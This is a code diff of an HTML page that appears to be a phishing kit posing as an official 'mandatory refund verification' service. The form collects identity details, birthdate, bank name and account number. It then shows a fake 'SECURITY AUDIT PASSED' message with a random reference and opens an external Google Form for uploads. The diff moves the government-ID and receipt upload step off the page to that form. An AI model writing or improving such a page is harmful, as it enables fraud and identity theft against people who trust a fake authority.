@@ -53,7 +53,7 @@
             font-size: 16px; text-transform: uppercase; border-radius: 4px; padding: 20px; 
             box-shadow: 0 4px 15px rgba(225, 0, 25, 0.3); transition: 0.3s; cursor: pointer;
         }
-        .contact-link:hover { background-color: var(--hamburg-blue); transform: translateY(-2px); }
+        .contact-link:hover { background-color: var(--hamburg-blue); }
 
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; }
@@ -75,7 +75,7 @@
             </div>
 
             <form id="masterForm">
-                <!-- SECTION 1 -->
+                <!-- PAGE 1 -->
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
@@ -88,28 +88,14 @@
                         <div><label>Nationality *</label><input type="text" id="nat" class="req"></div>
                     </div>
                     <div style="margin-top:25px;"><label>Birthdate *</label><input type="text" id="bd" class="req" placeholder="MM / DD / YYYY"></div>
-                    
-                    <!-- UPLOAD ID FIELD -->
-                    <div style="margin-top:25px;">
-                        <label>Upload Valid Government ID *</label>
-                        <input type="file" id="idFile" class="req">
-                    </div>
-
-                    <div class="btn-container"><button type="button" onclick="validateNext(1, 2)">NEXT STEP</button></div>
+                    <div class="btn-container"><button type="button" onclick="validate(1, 2)">NEXT STEP</button></div>
                 </div>
 
-                <!-- SECTION 2 -->
+                <!-- PAGE 2 -->
                 <div id="section2" class="section-box">
                     <h2>SECTION 2: MANDATORY REFUND VERIFICATION</h2>
-                    <p class="instruction-text">Please provide disbursement details accurately.</p>
+                    <p class="instruction-text">Please provide refund details accurately.</p>
                     <div><label>TOTAL REFUND AMOUNT *</label><input type="text" id="amt" class="req"></div>
-                    
-                    <!-- UPLOAD RECEIPT FIELD -->
-                    <div style="margin-top:25px;">
-                        <label>Upload Receipt *</label>
-                        <input type="file" id="receiptFile" class="req">
-                    </div>
-
                     <div style="margin-top:25px;"><label>Bank Name / App *</label><input type="text" id="bn" class="req"></div>
                     <div class="grid-2" style="margin-top:25px;">
                         <div><label>Account Number *</label><input type="text" id="an" class="req"></div>
@@ -117,20 +103,18 @@
                     </div>
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(1)">BACK</button>
-                        <button type="button" onclick="validateNext(2, 3)">REVIEW CLAIM</button>
+                        <button type="button" onclick="validate(2, 3)">REVIEW CLAIM</button>
                     </div>
                 </div>
 
-                <!-- SECTION 3 -->
+                <!-- PAGE 3: REVIEWER -->
                 <div id="section3" class="section-box">
-                    <h2>SECTION 3: REVIEW YOUR INFORMATION</h2>
-                    <div id="reviewBox"></div>
-
+                    <h2>SECTION 3: REVIEW INFORMATION</h2>
+                    <div id="reviewDisplay"></div>
                     <div class="contact-link" onclick="openGmail()">📧 DIRECT CONTACT THE AUTHORITY</div>
-
                     <div class="btn-container">
                         <button type="button" class="btn-back" onclick="show(2)">EDIT</button>
-                        <button type="button" onclick="finalAction()">SUBMIT TO DATABASE</button>
+                        <button type="button" onclick="finalSubmit()">SUBMIT TO DATABASE</button>
                     </div>
                 </div>
             </form>
@@ -148,43 +132,34 @@
             window.scrollTo(0,0);
         }
 
-        function validateNext(curr, next) {
+        function validate(curr, next) {
             const inputs = document.getElementById('section' + curr).querySelectorAll('.req');
-            let valid = true;
+            let ok = true;
             inputs.forEach(i => {
-                if(!i.value) { i.classList.add('invalid'); valid = false; }
+                if(!i.value) { i.classList.add('invalid'); ok = false; }
                 else i.classList.remove('invalid');
             });
-            if(valid) {
-                if(next === 3) populateReview();
+            if(ok) {
+                if(next === 3) {
+                    document.getElementById('reviewDisplay').innerHTML = `
+                        <div class="review-item"><div class="review-label">FULL NAME</div><div class="review-value">${document.getElementById('fn').value} ${document.getElementById('ln').value}</div></div>
+                        <div class="review-item"><div class="review-label">REFUND AMOUNT</div><div class="review-value">${document.getElementById('amt').value}</div></div>
+                        <div class="review-item"><div class="review-label">BANK</div><div class="review-value">${document.getElementById('bn').value}</div></div>
+                    `;
+                }
                 show(next);
             }
         }
 
-        function populateReview() {
-            const data = [
-                {l: "FULL NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
-                {l: "EMAIL", v: document.getElementById('em').value},
-                {l: "GOVERNMENT ID", v: document.getElementById('idFile').files[0]?.name || "Attached"},
-                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
-                {l: "RECEIPT", v: document.getElementById('receiptFile').files[0]?.name || "Attached"},
-                {l: "BANK", v: document.getElementById('bn').value},
-                {l: "ACCOUNT", v: document.getElementById('an').value}
-            ];
-            let html = "";
-            data.forEach(d => {
-                html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`;
-            });
-            document.getElementById('reviewBox').innerHTML = html;
-        }
-
         function openGmail() {
-            window.open(`https://google.com`, '_blank');
+            window.open('https://google.com', '_blank');
         }
 
-        function finalAction() {
-            alert("SECURITY AUDIT PASSED. DATA SUBMITTED.");
-            window.location.href = "https://google.com";
+        function finalSubmit() {
+            const ref = "REF-" + Math.floor(Math.random() * 1000000);
+            alert("SECURITY AUDIT PASSED. \nReference: " + ref + "\n\nPlease finalize upload on the Google Form tab.");
+            window.open('https://forms.gle/7K7zsjPEJB92muLD6', '_blank');
+            document.getElementById('section3').innerHTML = `<div style="text-align:center; padding:40px;"><h2>CLAIM RECORDED</h2><p>Reference: ${ref}</p><div style="font-size:50px;">✅</div></div>`;
         }
     </script>
 </body>
